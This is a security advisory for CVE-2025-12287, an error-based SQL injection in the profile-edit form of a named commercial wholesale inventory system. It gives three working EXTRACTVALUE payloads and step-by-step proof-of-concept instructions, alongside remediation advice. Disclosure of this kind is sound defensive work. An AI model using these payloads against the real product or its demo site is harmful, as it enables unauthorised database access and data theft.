# [Error-Based SQL Injection] in [Wholesale Inventory Management System]

---

### üë®‚Äçüíª **BUG Author:**

### 4m3rr0r
### CVE-2025-12287

---

### üì¶ **Product Information:**

* **Vendor Homepage:** [https://www.bdtask.com](https://www.bdtask.com)
* **Software Link:** [https://codecanyon.net/item/wholesale-inventory-control-and-inventory-management-system/20291791](https://codecanyon.net/item/wholesale-inventory-control-and-inventory-management-system/20291791)
* **Demo URL:** `https://wholesaledemo.bdtask-demo.com/`
* **Affected Version:** Latest version as of 2025-10-13
* **BUG Author:** 4m3rr0r

---

### üõ† **Vulnerability Details**

* **Type:** Error-Based SQL Injection
* **Affected URL:** `/Admin_dashboard/edit_profile`
* **Vulnerable Parameter:** `first_name`, `last_name` (in the POST request)
* **Vulnerable Component:** The user profile update functionality.

---

### üß® **Vulnerability Type**

* **SQL Injection**
* **CWE ID:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command
* **Severity Level:** CRITICAL
* **CVSS Score:** 9.8 (Critical)

---

### üß¨ **Root Cause**

The application constructs an SQL `UPDATE` query by directly concatenating unvalidated and unsanitized user input from the "First name" and "Last name" fields. An attacker can inject a single quote (`'`) to break out of the SQL statement and append malicious commands. The application is configured to display database errors, allowing the attacker to exfiltrate data through error messages generated by functions like `EXTRACTVALUE`.

---

### ‚ö†Ô∏è **Impact**

* **Full Database Compromise:** An attacker can read, modify, or delete any data in the database.
* **Sensitive Data Exposure:** This includes administrator credentials, user information, inventory data, and sales records.
* **Authentication Bypass:** The vulnerability could potentially be used to extract user password hashes, leading to account takeovers.
* **Potential for RCE:** In some database configurations, SQL injection can be escalated to achieve Remote Code Execution on the server.

---

### üìã **Description**

1.  **Vulnerability Details:**
    * The `edit_profile` page allows authenticated admins to update their personal information.
    * The `first_name` and `last_name` parameters are directly included in an SQL query without the use of prepared statements.

2.  **Attack Vectors:**
    * An attacker can use error-based payloads to force the MySQL database to reveal information within its error messages.
    * The `EXTRACTVALUE` function is used to trigger an invalid XPath syntax error, which includes the output of a nested SQL function (e.g., `VERSION()`).

3.  **Attack Payload Examples:**
    * To get the database version:
        ```sql
        ' AND EXTRACTVALUE(1, CONCAT(0x3a, VERSION())) -- -
        ```
    * To get the database user:
        ```sql
        ' AND EXTRACTVALUE(1, CONCAT(0x3a, USER())) -- -
        ```
    * To get the database name:
        ```sql
        ' AND EXTRACTVALUE(1, CONCAT(0x3a, DATABASE())) -- -
        ```

---

### üî¨ **Proof of Concept (PoC)**


[![Watch the video](https://img.youtube.com/vi/mYOFMDAEaYo/0.jpg)](https://youtu.be/mYOFMDAEaYo)


1.  Log in to the administrator panel.
2.  Navigate to the **"Edit Profile"** page (`/Admin_dashboard/edit_profile`).
3.  In the **"Last name"** field, enter the following payload:
    `' AND EXTRACTVALUE(1, CONCAT(0x3a, VERSION())) -- -`
4.  Submit the form.
5.  The application will fail and display a database error message on the screen, such as:
    `XPATH syntax error: ':10.11.13-MariaDB'`
6.  This error message confirms the vulnerability and reveals the database version. The same technique can be used with `USER()` and `DATABASE()` to extract more information.

---

### üõ° **Suggested Remediation**

* **Use Parameterized Queries (Prepared Statements):** This is the most effective way to prevent SQL injection. The database query and the user data should be sent separately.
* **Validate and Sanitize Input:** As a secondary defense, all user input should be validated against a strict whitelist of expected characters and formats.


### üîê **Security Recommendations**

* Disable detailed database error messages in the production environment.
* Apply the Principle of Least Privilege to the database user, ensuring it only has the minimum permissions necessary.
* Conduct regular security code reviews and use static analysis (SAST) tools to find vulnerabilities.

---

### üìö **References**

* [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
* [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

---
